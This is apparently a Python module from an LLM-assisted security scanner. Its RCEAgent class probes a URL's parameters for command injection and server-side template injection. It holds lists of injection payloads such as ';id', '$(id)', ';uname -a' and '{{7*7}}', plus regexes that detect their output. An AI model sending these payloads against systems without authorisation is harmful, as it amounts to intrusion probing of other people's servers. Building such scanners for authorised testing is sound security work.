"""RCE Attack Agent — Command injection, SSTI, deserialization 🤖"""
import re
from briar.agents.analyzer import SecurityAnalyzer
from briar.core.http import HTTPClient
from briar.core.params import RCE_CMD as RCE_PARAMS

class RCEAgent:
    """Discovers Remote Code Execution vulnerabilities with real payloads"""

    CMD_PAYLOADS = [
        (";id", "semicolon"),
        ("|id", "pipe"),
        ("`id`", "backtick"),
        ("$(id)", "subshell"),
        ("&&id", "and_and"),
        (";uname -a", "uname"),
        ("|uname -a", "pipe_uname"),
    ]

    SSTI_PAYLOADS = [
        ("{{7*7}}", "jinja2"),
        ("${7*7}", "jstl"),
        ("<%= 7*7 %>", "erb"),
        ("{{config}}", "jinja2_config"),
        ("#{7*7}", "ruby"),
    ]

    CMD_MARKERS = [
        (r"uid=\d+\([^)]+\)", "id command output"),
        (r"gid=\d+\([^)]+\)", "id command output"),
        (r"Linux\s+\S+", "uname output"),
    ]

    def __init__(self, provider="ollama"):
        self.analyzer = SecurityAnalyzer(provider)
        self.http = HTTPClient(timeout=10)
        self.name = "RCE"

    def scan(self, url: str, tech_context: str = "", **kwargs) -> dict:
        """Scan for RCE vulnerabilities (command injection + SSTI)"""
        findings = []
        rce_params = RCE_PARAMS

        for param in rce_params[:10]:
            # Command injection
            for payload, cmd_type in self.CMD_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue
                    text = result.get("text_snippet", "")
                    for pattern, desc in self.CMD_MARKERS:
                        if re.search(pattern, text):
                            findings.append({
                                "type": f"Command Injection ({cmd_type})",
                                "severity": "Critical",
                                "param": param,
                                "payload": payload,
                                "rce_type": "command_injection",
                                "detected": desc,
                            })
                            break
                    if findings:
                        break
                except:
                    pass

            if findings:
                break  # Found RCE on this param

            # SSTI
            for payload, engine in self.SSTI_PAYLOADS:
                try:
                    result = self.http.send_payload(url, param, payload)
                    if "error" in result:
                        continue
                    text = result.get("text_snippet", "")
                    if "49" in text and "7*7" in payload:
                        findings.append({
                            "type": f"SSTI ({engine})",
                            "severity": "Critical",
                            "param": param,
                            "payload": payload,
                            "rce_type": "ssti",
                            "detected": "7*7 evaluated to 49",
                        })
                        break
                except:
                    pass

            if findings:
                break

        if not findings:
            findings.append({"type": "No RCE/SSTI detected", "severity": "Info"})

        analysis = f"RCE scan complete for {url}\n\n"
        real_vulns = [f for f in findings if f["severity"] in ("Critical",)]
        if real_vulns:
            analysis += f"**{len(real_vulns)} RCE/SSTI vulnerabilities found:**\n\n"
            for f in real_vulns:
                analysis += f"- **{f['type']}**: param `{f['param']}` — {f.get('detected','')} (payload: `{f['payload']}`)\n"
            analysis += "\n---\n\nLLM analysis of real RCE findings:\n"

        result = self.analyzer.analyze_endpoint(url, "GET/POST", tech_context=tech_context, source_hint= analysis)
        result["real_findings"] = findings
        result["agent"] = self.name
        result["type"] = "RCE"
        result["severity"] = "Critical" if real_vulns else "Info"
        return result
